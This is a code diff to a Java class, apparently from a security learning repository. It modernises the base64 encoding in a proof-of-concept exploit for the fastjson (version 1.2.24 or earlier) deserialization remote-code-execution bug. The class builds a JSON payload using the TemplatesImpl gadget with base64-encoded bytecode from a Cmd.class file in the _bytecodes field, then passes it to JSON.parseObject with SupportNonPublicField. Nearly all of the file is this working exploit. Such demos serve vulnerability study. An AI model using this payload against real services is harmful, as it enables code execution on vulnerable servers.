@@ -3,12 +3,12 @@ package com.security.bug.fastjson.rce;
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.parser.Feature;
 import com.security.bug.common.utils.FileToByteArrayUtil;
-import sun.misc.BASE64Encoder;
+import java.util.Base64;
 
 /**
  * 利用fastjson开启type的漏洞，fastjson版本<=1.2.24 + Feature.SupportNonPublicField
  *
-
+ * 
  */
 public class FastjsonSerialize {
     public static void main(String[] args) {
@@ -19,20 +19,20 @@ public class FastjsonSerialize {
         try {
             StringBuilder stringBuilder = new StringBuilder();
             stringBuilder.append("{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",");
-            String base64Class = new BASE64Encoder().encode(FileToByteArrayUtil.readCallbackRuntimeClassBytes("com.security.bug/fastjson/rce/Cmd.class"));
-            base64Class = base64Class.replaceAll("\\r\\n","");
-            stringBuilder.append("\"_bytecodes\":[\""+base64Class+"\"],");
+            String base64Class = Base64.getEncoder().encodeToString(
+                    FileToByteArrayUtil.readCallbackRuntimeClassBytes("com.security.bug/fastjson/rce/Cmd.class"));
+            base64Class = base64Class.replaceAll("\\r\\n", "");
+            stringBuilder.append("\"_bytecodes\":[\"" + base64Class + "\"],");
             stringBuilder.append("\"_name\":\"a.b\",");
             stringBuilder.append("\"_tfactory\":{},");
             stringBuilder.append("\"_outputProperties\":{}}");
             String exp = stringBuilder.toString();
             System.out.println(exp);
-            //漏洞利用条件，fastjson版本<=1.2.24 + Feature.SupportNonPublicField
-            JSON.parseObject(exp,Object.class, Feature.SupportNonPublicField);
+            // 漏洞利用条件，fastjson版本<=1.2.24 + Feature.SupportNonPublicField
+            JSON.parseObject(exp, Object.class, Feature.SupportNonPublicField);
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
 }
-
